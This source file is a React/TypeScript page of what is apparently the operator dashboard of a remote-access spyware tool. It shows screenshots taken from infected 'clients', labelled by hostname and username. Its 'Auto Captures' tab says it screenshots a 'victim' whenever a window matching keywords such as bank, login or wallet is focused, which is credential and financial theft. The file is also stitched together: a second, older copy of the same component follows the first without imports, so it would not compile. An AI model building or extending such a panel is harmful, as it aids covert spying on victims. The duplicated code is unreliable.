import { useCallback, useEffect, useMemo, useState } from 'react'
import { useBridgeWebSocket } from '../../hooks/BridgeWebSocketProvider'
import { useDatabaseQuery, type DatabaseQueryParams } from '../../hooks/useDatabaseQuery'
import ScreenshotGallery, { type ScreenshotItem } from '../../UI/ScreenshotGallery'
import ClientFilter from '../../UI/ClientFilter'
import type { ClientInfo } from '../../UI/ClientFilter'
import { useDashboardStore } from '../../store/dashboardStore.ts'
import { Trash2 } from 'lucide-react'

const PAGE_SIZE = 12

interface DbScreenshotRow {
  id: number
  client_id: string
  timestamp: number
  image_data?: string
  image_size?: number
  image_format?: string
  is_stream?: number
}

interface AutoShotRow {
  id: number
  client_id: string
  window_title: string
  image_data: string
  captured_at: number
}

interface DbClientRow extends ClientInfo {}

function getImageMimeType(format?: string): string {
  const normalized = (format ?? '').toLowerCase()
  if (normalized === 'bmp') return 'image/bmp'
  if (normalized === 'png') return 'image/png'
  return 'image/jpeg'
}

function toLocalDateKey(timestamp: string): string {
  const date = new Date(timestamp)
  const year = date.getFullYear()
  const month = String(date.getMonth() + 1).padStart(2, '0')
  const day = String(date.getDate()).padStart(2, '0')
  return `${year}-${month}-${day}`
}

function mapRowToScreenshotItem(row: DbScreenshotRow): ScreenshotItem | null {
  if (!row.image_data) return null
  return {
    id: row.id,
    clientId: row.client_id,
    timestamp: new Date(row.timestamp).toISOString(),
    url: `data:${getImageMimeType(row.image_format)};base64,${row.image_data}`,
    imageSize: row.image_size,
    isStream: Boolean(row.is_stream),
  }
}

export default function ScreenshotsPage() {
  const { isConnected, subscribe, sendMessage } = useBridgeWebSocket()
  const { clients: cachedClients } = useDashboardStore()

  const [activeTab, setActiveTab] = useState<'manual' | 'auto'>('manual')
  const [selectedClientId, setSelectedClientId] = useState<string>('all')
  const [selectedDate, setSelectedDate] = useState<string>('')
  const [currentPage, setCurrentPage] = useState(1)
  const [liveItems, setLiveItems] = useState<ScreenshotItem[]>([])
  const [realtimeClients, setRealtimeClients] = useState<DbClientRow[]>([])

  // Auto-captures state
  const [autoShots, setAutoShots] = useState<AutoShotRow[]>([])
  const [liveAutoShots, setLiveAutoShots] = useState<AutoShotRow[]>([])
  const [expandedClients, setExpandedClients] = useState<Set<string>>(new Set())

  const {
    data: screenshotRows,
    executeQuery: executeScreenshotQuery,
    isLoading,
    isError,
    error,
  } = useDatabaseQuery<DbScreenshotRow[]>()

  const { data: clientRows } = useDatabaseQuery<DbClientRow[]>()
  const { data: autoShotRows, executeQuery: executeAutoQuery } = useDatabaseQuery<AutoShotRow[]>()

  const loadScreenshots = useCallback(async () => {
    const query: DatabaseQueryParams = {
      query: 'get_screenshots',
      limit: 500,
      offset: 0,
      includeData: true,
    }
    if (selectedClientId !== 'all') query.clientId = selectedClientId
    await executeScreenshotQuery(query)
  }, [executeScreenshotQuery, selectedClientId])

  const loadAutoShots = useCallback(async () => {
    await executeAutoQuery({ query: 'get_auto_screenshots', limit: 200, offset: 0 } as any)
  }, [executeAutoQuery])

  useEffect(() => {
    if (cachedClients.length > 0) setRealtimeClients(cachedClients as DbClientRow[])
  }, [cachedClients])

  // Real-time client list updates
  useEffect(() => {
    if (!isConnected) return
    const unsub = subscribe('client_list', (msg: any) => {
      if (Array.isArray(msg.clients)) setRealtimeClients(msg.clients)
    })
    return () => unsub()
  }, [isConnected, subscribe])

  useEffect(() => {
    if (!isConnected) return
    setCurrentPage(1)
    void loadScreenshots()
    void loadAutoShots()
  }, [isConnected, loadScreenshots, loadAutoShots])

  // Sync DB auto-shots into state
  useEffect(() => {
    if (autoShotRows && Array.isArray(autoShotRows)) setAutoShots(autoShotRows)
  }, [autoShotRows])

  // Live auto-screenshot events
  useEffect(() => {
    if (!isConnected) return
    const unsub = subscribe('auto_screenshot', (msg: any) => {
      const item: AutoShotRow = {
        id: Date.now() * -1,
        client_id: msg.clientId,
        window_title: msg.windowTitle,
        image_data: msg.data,
        captured_at: msg.timestamp ?? Date.now(),
      }
      setLiveAutoShots((prev) => [item, ...prev])
      setExpandedClients((prev) => new Set([...prev, msg.clientId]))
    })
    return () => unsub()
  }, [isConnected, subscribe])

  // Manual screenshot live events
  useEffect(() => {
    if (!isConnected) return
    const unsub = subscribe('screenshot', (msg: any) => {
      if (!msg.data) return
      const item: ScreenshotItem = {
        id: Date.now() * -1,
        clientId: msg.clientId,
        timestamp: new Date(msg.timestamp ?? Date.now()).toISOString(),
        url: `data:image/jpeg;base64,${msg.data}`,
        imageSize: msg.size,
        isStream: false,
      }
      setLiveItems((prev) => [item, ...prev])
    })
    return () => unsub()
  }, [isConnected, subscribe])

  const baseItems = useMemo(() => {
    return (screenshotRows ?? []).map(mapRowToScreenshotItem).filter((item): item is ScreenshotItem => item !== null)
  }, [screenshotRows])

  const allItems = useMemo(() => [...liveItems, ...baseItems], [liveItems, baseItems])

  const filteredItems = useMemo(() => {
    return allItems.filter((item) => {
      if (selectedDate && toLocalDateKey(item.timestamp) !== selectedDate) return false
      return true
    })
  }, [allItems, selectedDate])

  const totalPages = Math.max(1, Math.ceil(filteredItems.length / PAGE_SIZE))

  const pagedItems = useMemo(() => {
    const start = (currentPage - 1) * PAGE_SIZE
    return filteredItems.slice(start, start + PAGE_SIZE)
  }, [filteredItems, currentPage])

  const handleRefresh = useCallback(async () => {
    setLiveItems([])
    setLiveAutoShots([])
    await loadScreenshots()
    await loadAutoShots()
  }, [loadScreenshots, loadAutoShots])

  const handleDelete = useCallback(
    async (item: ScreenshotItem) => {
      if (item.id <= 0) {
        setLiveItems((prev) => prev.filter((e) => e.id !== item.id))
        return
      }
      await executeScreenshotQuery({ query: 'delete_screenshot', screenshotId: item.id })
      await loadScreenshots()
    },
    [executeScreenshotQuery, loadScreenshots],
  )

  const handleExport = useCallback((item: ScreenshotItem) => {
    const blob = new Blob([JSON.stringify({ id: item.id, clientId: item.clientId, timestamp: item.timestamp, dataUrl: item.url }, null, 2)], { type: 'application/json' })
    const objectUrl = URL.createObjectURL(blob)
    const anchor = document.createElement('a')
    anchor.href = objectUrl
    anchor.download = `screenshot-${item.clientId}-${new Date(item.timestamp).getTime()}.json`
    document.body.appendChild(anchor)
    anchor.click()
    document.body.removeChild(anchor)
    URL.revokeObjectURL(objectUrl)
  }, [])

  const handleDeleteAutoShot = useCallback(
    async (shot: AutoShotRow) => {
      if (shot.id < 0) {
        setLiveAutoShots((prev) => prev.filter((s) => s.id !== shot.id))
        return
      }
      await executeAutoQuery({ query: 'delete_auto_screenshot', id: shot.id } as any)
      setAutoShots((prev) => prev.filter((s) => s.id !== shot.id))
    },
    [executeAutoQuery],
  )

  const clients = realtimeClients.length ? realtimeClients : (clientRows ?? [])

  // Merge DB + live auto shots, dedupe by id
  const allAutoShots = useMemo(() => {
    const merged = [...liveAutoShots, ...autoShots]
    const seen = new Set<number>()
    return merged.filter((s) => { if (seen.has(s.id)) return false; seen.add(s.id); return true })
  }, [liveAutoShots, autoShots])

  // Group auto shots by client
  const autoShotsByClient = useMemo(() => {
    const map = new Map<string, AutoShotRow[]>()
    for (const s of allAutoShots) {
      const arr = map.get(s.client_id) ?? []
      arr.push(s)
      map.set(s.client_id, arr)
    }
    return map
  }, [allAutoShots])

  const getClientLabel = (clientId: string) => {
    const c = clients.find((cl) => cl.id === clientId)
    return c ? `${c.hostname ?? clientId} (${c.username ?? ''})` : clientId
  }

  return (
    <div className="space-y-4">
      <div>
        <h3 className="text-2xl font-semibold text-slate-100">Screenshots</h3>
        <p className="text-sm text-slate-400">Manual captures and keyword-triggered auto captures.</p>
      </div>

      {/* Tab strip */}
      <div className="flex gap-1 border-b border-slate-700">
        {(['manual', 'auto'] as const).map((tab) => (
          <button
            key={tab}
            type="button"
            onClick={() => setActiveTab(tab)}
            className={`px-4 py-2 text-sm font-medium border-b-2 transition-colors ${
              activeTab === tab
                ? 'border-blue-500 text-blue-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            {tab === 'manual' ? 'Manual Captures' : `Auto Captures${allAutoShots.length ? ` (${allAutoShots.length})` : ''}`}
          </button>
        ))}
      </div>

      {/* ── Manual tab ─────────────────────────────────────────────────── */}
      {activeTab === 'manual' && (
        <>
          <section className="panel p-4">
            <div className="grid grid-cols-1 gap-3 md:grid-cols-4">
              <label className="text-xs text-slate-400">
                Client
                <div className="mt-1">
                  <ClientFilter
                    clients={clients}
                    value={selectedClientId}
                    onChange={(id) => { setSelectedClientId(id); setCurrentPage(1); setLiveItems([]) }}
                    allowAll
                    allLabel="All clients"
                  />
                </div>
              </label>
              <label className="text-xs text-slate-400">
                Date
                <input
                  type="date"
                  value={selectedDate}
                  onChange={(e) => { setSelectedDate(e.target.value); setCurrentPage(1) }}
                  className="mt-1 w-full rounded-md border border-slate-700 bg-slate-900 px-2 py-1.5 text-sm text-slate-200"
                />
              </label>
              <div className="text-xs text-slate-400">
                Connection
                <p className="mt-1 rounded-md border border-slate-700 bg-slate-900 px-2 py-1.5 text-sm text-slate-200">
                  {isConnected ? 'WebSocket connected' : 'WebSocket disconnected'}
                </p>
              </div>
              <div className="text-xs text-slate-400">
                Live buffer
                <p className="mt-1 rounded-md border border-slate-700 bg-slate-900 px-2 py-1.5 text-sm text-slate-200">{liveItems.length} frame(s)</p>
              </div>
            </div>
          </section>

          {isError ? <p className="text-sm text-rose-300">{error ?? 'Failed to load screenshots'}</p> : null}
          {isLoading ? <p className="text-sm text-slate-400">Loading screenshots...</p> : null}

          <ScreenshotGallery screenshots={pagedItems} onRefresh={handleRefresh} onDelete={handleDelete} onExport={handleExport} />

          <section className="panel p-3">
            <div className="flex items-center justify-between text-sm text-slate-300">
              <span>Showing {pagedItems.length} of {filteredItems.length} screenshot(s)</span>
              <span>Page {currentPage} of {totalPages}</span>
            </div>
            <div className="mt-3 flex items-center gap-2">
              <button
                type="button"
                disabled={currentPage <= 1}
                onClick={() => setCurrentPage((p) => Math.max(1, p - 1))}
                className="rounded-md border border-slate-700 bg-slate-900 px-3 py-1.5 text-xs text-slate-200 disabled:opacity-40"
              >Previous</button>
              <button
                type="button"
                disabled={currentPage >= totalPages}
                onClick={() => setCurrentPage((p) => Math.min(totalPages, p + 1))}
                className="rounded-md border border-slate-700 bg-slate-900 px-3 py-1.5 text-xs text-slate-200 disabled:opacity-40"
              >Next</button>
            </div>
          </section>
        </>
      )}

      {/* ── Auto Captures tab ───────────────────────────────────────────── */}
      {activeTab === 'auto' && (
        <div className="space-y-4">
          <div className="flex items-center justify-between">
            <p className="text-xs text-slate-400">
              Automatically captured when victim focuses a window matching sensitive keywords (bank, login, wallet, etc.).
            </p>
            <button
              type="button"
              onClick={handleRefresh}
              className="rounded-md border border-slate-700 bg-slate-800 px-3 py-1.5 text-xs text-slate-200 hover:bg-slate-700"
            >Refresh</button>
          </div>

          {allAutoShots.length === 0 && (
            <div className="panel p-8 text-center text-sm text-slate-400">
              No auto-captures yet. Screenshots will appear here automatically when a connected client opens a sensitive window.
            </div>
          )}

          {[...autoShotsByClient.entries()].map(([clientId, shots]) => {
            const expanded = expandedClients.has(clientId)
            return (
              <div key={clientId} className="panel overflow-hidden">
                {/* Client header */}
                <button
                  type="button"
                  onClick={() => setExpandedClients((prev) => {
                    const next = new Set(prev)
                    if (next.has(clientId)) next.delete(clientId)
                    else next.add(clientId)
                    return next
                  })}
                  className="flex w-full items-center justify-between px-4 py-3 text-left hover:bg-slate-800/50"
                >
                  <div>
                    <span className="text-sm font-medium text-slate-100">{getClientLabel(clientId)}</span>
                    <span className="ml-2 text-xs text-slate-400">{shots.length} capture(s)</span>
                  </div>
                  <span className="text-xs text-slate-500">{expanded ? '▲ collapse' : '▼ expand'}</span>
                </button>

                {expanded && (
                  <div className="border-t border-slate-700 p-4">
                    <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4">
                      {shots.map((shot) => (
                        <div key={shot.id} className="group relative flex flex-col gap-2 rounded-lg border border-slate-700 bg-slate-900 p-2">
                          <img
                            src={`data:image/jpeg;base64,${shot.image_data}`}
                            alt={shot.window_title}
                            className="w-full rounded object-cover"
                            style={{ maxHeight: '160px', objectFit: 'cover' }}
                          />
                          <div className="flex items-start justify-between gap-1">
                            <div className="min-w-0">
                              <p className="truncate text-xs font-medium text-slate-200" title={shot.window_title}>
                                {shot.window_title}
                              </p>
                              <p className="text-xs text-slate-500">
                                {new Date(shot.captured_at).toLocaleString()}
                              </p>
                            </div>
                            <button
                              type="button"
                              onClick={() => handleDeleteAutoShot(shot)}
                              className="shrink-0 rounded p-1 text-slate-500 hover:bg-rose-900/40 hover:text-rose-400"
                              title="Delete"
                            >
                              <Trash2 size={13} />
                            </button>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            )
          })}
        </div>
      )}
    </div>
  )
}


const PAGE_SIZE = 12

interface DbScreenshotRow {
  id: number
  client_id: string
  timestamp: number
  image_data?: string
  image_size?: number
  image_format?: string
  is_stream?: number
}

interface DbClientRow extends ClientInfo {}

function getImageMimeType(format?: string): string {
  const normalized = (format ?? '').toLowerCase()
  if (normalized === 'bmp') return 'image/bmp'
  if (normalized === 'png') return 'image/png'
  return 'image/jpeg'
}

function toLocalDateKey(timestamp: string): string {
  const date = new Date(timestamp)
  const year = date.getFullYear()
  const month = String(date.getMonth() + 1).padStart(2, '0')
  const day = String(date.getDate()).padStart(2, '0')
  return `${year}-${month}-${day}`
}

function mapRowToScreenshotItem(row: DbScreenshotRow): ScreenshotItem | null {
  if (!row.image_data) {
    return null
  }

  return {
    id: row.id,
    clientId: row.client_id,
    timestamp: new Date(row.timestamp).toISOString(),
    url: `data:${getImageMimeType(row.image_format)};base64,${row.image_data}`,
    imageSize: row.image_size,
    isStream: Boolean(row.is_stream),
  }
}

export default function ScreenshotsPage() {
  const { isConnected, subscribe } = useBridgeWebSocket()
  const { clients: cachedClients } = useDashboardStore()

  const [selectedClientId, setSelectedClientId] = useState<string>('all')
  const [selectedDate, setSelectedDate] = useState<string>('')
  const [currentPage, setCurrentPage] = useState(1)
  const [liveItems, setLiveItems] = useState<ScreenshotItem[]>([])
  const [realtimeClients, setRealtimeClients] = useState<DbClientRow[]>([])

  const {
    data: screenshotRows,
    executeQuery: executeScreenshotQuery,
    isLoading,
    isError,
    error,
  } = useDatabaseQuery<DbScreenshotRow[]>()

  const { data: clientRows } = useDatabaseQuery<DbClientRow[]>()

  const loadScreenshots = useCallback(async () => {
    const query: DatabaseQueryParams = {
      query: 'get_screenshots',
      limit: 500,
      offset: 0,
      includeData: true,
    }

    if (selectedClientId !== 'all') {
      query.clientId = selectedClientId
    }

    await executeScreenshotQuery(query)
  }, [executeScreenshotQuery, selectedClientId])

  useEffect(() => {
    if (cachedClients.length > 0) {
      setRealtimeClients(cachedClients as DbClientRow[])
    }
  }, [cachedClients])

  // Real-time online/offline dot updates via client_list broadcast
  useEffect(() => {
    if (!isConnected) return
    const unsub = subscribe('client_list', (msg: any) => {
      if (Array.isArray(msg.clients)) setRealtimeClients(msg.clients)
    })
    return () => unsub()
  }, [isConnected, subscribe])

  useEffect(() => {
    if (!isConnected) {
      return
    }

    setCurrentPage(1)
    void loadScreenshots()
  }, [isConnected, loadScreenshots])

  const baseItems = useMemo(() => {
    return (screenshotRows ?? [])
      .map(mapRowToScreenshotItem)
      .filter((item): item is ScreenshotItem => item !== null)
  }, [screenshotRows])

  const allItems = useMemo(() => {
    return [...liveItems, ...baseItems]
  }, [liveItems, baseItems])

  const filteredItems = useMemo(() => {
    return allItems.filter((item) => {
      if (selectedDate && toLocalDateKey(item.timestamp) !== selectedDate) {
        return false
      }
      return true
    })
  }, [allItems, selectedDate])

  const totalPages = Math.max(1, Math.ceil(filteredItems.length / PAGE_SIZE))

  const pagedItems = useMemo(() => {
    const start = (currentPage - 1) * PAGE_SIZE
    return filteredItems.slice(start, start + PAGE_SIZE)
  }, [filteredItems, currentPage])

  const handleRefresh = useCallback(async () => {
    setLiveItems([])
    await loadScreenshots()
  }, [loadScreenshots])

  const handleDelete = useCallback(
    async (item: ScreenshotItem) => {
      if (item.id <= 0) {
        setLiveItems((previous) => previous.filter((entry) => entry.id !== item.id))
        return
      }

      await executeScreenshotQuery({
        query: 'delete_screenshot',
        screenshotId: item.id,
      })

      await loadScreenshots()
    },
    [executeScreenshotQuery, loadScreenshots],
  )

  const handleExport = useCallback((item: ScreenshotItem) => {
    const blob = new Blob(
      [
        JSON.stringify(
          {
            id: item.id,
            clientId: item.clientId,
            timestamp: item.timestamp,
            imageSize: item.imageSize,
            isStream: item.isStream,
            dataUrl: item.url,
          },
          null,
          2,
        ),
      ],
      { type: 'application/json' },
    )

    const objectUrl = URL.createObjectURL(blob)
    const anchor = document.createElement('a')
    anchor.href = objectUrl
    anchor.download = `screenshot-${item.clientId}-${new Date(item.timestamp).getTime()}.json`
    document.body.appendChild(anchor)
    anchor.click()
    document.body.removeChild(anchor)
    URL.revokeObjectURL(objectUrl)
  }, [])

  const clients = realtimeClients.length ? realtimeClients : (clientRows ?? [])

  return (
    <div className="space-y-4">
      <div>
        <h3 className="text-2xl font-semibold text-slate-100">Screenshots</h3>
        <p className="text-sm text-slate-400">Database-backed screenshot viewer with live stream updates.</p>
      </div>

      <section className="panel p-4">
        <div className="grid grid-cols-1 gap-3 md:grid-cols-4">
          <label className="text-xs text-slate-400">
            Client
            <div className="mt-1">
              <ClientFilter
                clients={clients}
                value={selectedClientId}
                onChange={(id) => {
                  setSelectedClientId(id)
                  setCurrentPage(1)
                  setLiveItems([])
                }}
                allowAll
                allLabel="All clients"
              />
            </div>
          </label>

          <label className="text-xs text-slate-400">
            Date
            <input
              type="date"
              value={selectedDate}
              onChange={(event) => {
                setSelectedDate(event.target.value)
                setCurrentPage(1)
              }}
              className="mt-1 w-full rounded-md border border-slate-700 bg-slate-900 px-2 py-1.5 text-sm text-slate-200"
            />
          </label>

          <div className="text-xs text-slate-400">
            Connection
            <p className="mt-1 rounded-md border border-slate-700 bg-slate-900 px-2 py-1.5 text-sm text-slate-200">
              {isConnected ? 'WebSocket connected' : 'WebSocket disconnected'}
            </p>
          </div>

          <div className="text-xs text-slate-400">
            Live buffer
            <p className="mt-1 rounded-md border border-slate-700 bg-slate-900 px-2 py-1.5 text-sm text-slate-200">{liveItems.length} frame(s)</p>
          </div>
        </div>
      </section>

      {isError ? <p className="text-sm text-rose-300">{error ?? 'Failed to load screenshots'}</p> : null}
      {isLoading ? <p className="text-sm text-slate-400">Loading screenshots...</p> : null}

      <ScreenshotGallery screenshots={pagedItems} onRefresh={handleRefresh} onDelete={handleDelete} onExport={handleExport} />

      <section className="panel p-3">
        <div className="flex items-center justify-between text-sm text-slate-300">
          <span>
            Showing {pagedItems.length} of {filteredItems.length} screenshot(s)
          </span>
          <span>
            Page {currentPage} of {totalPages}
          </span>
        </div>
        <div className="mt-3 flex items-center gap-2">
          <button
            type="button"
            disabled={currentPage <= 1}
            onClick={() => setCurrentPage((page) => Math.max(1, page - 1))}
            className="rounded-md border border-slate-700 bg-slate-900 px-3 py-1.5 text-xs text-slate-200 disabled:opacity-40"
          >
            Previous
          </button>
          <button
            type="button"
            disabled={currentPage >= totalPages}
            onClick={() => setCurrentPage((page) => Math.min(totalPages, page + 1))}
            className="rounded-md border border-slate-700 bg-slate-900 px-3 py-1.5 text-xs text-slate-200 disabled:opacity-40"
          >
            Next
          </button>
        </div>
      </section>
    </div>
  )
}
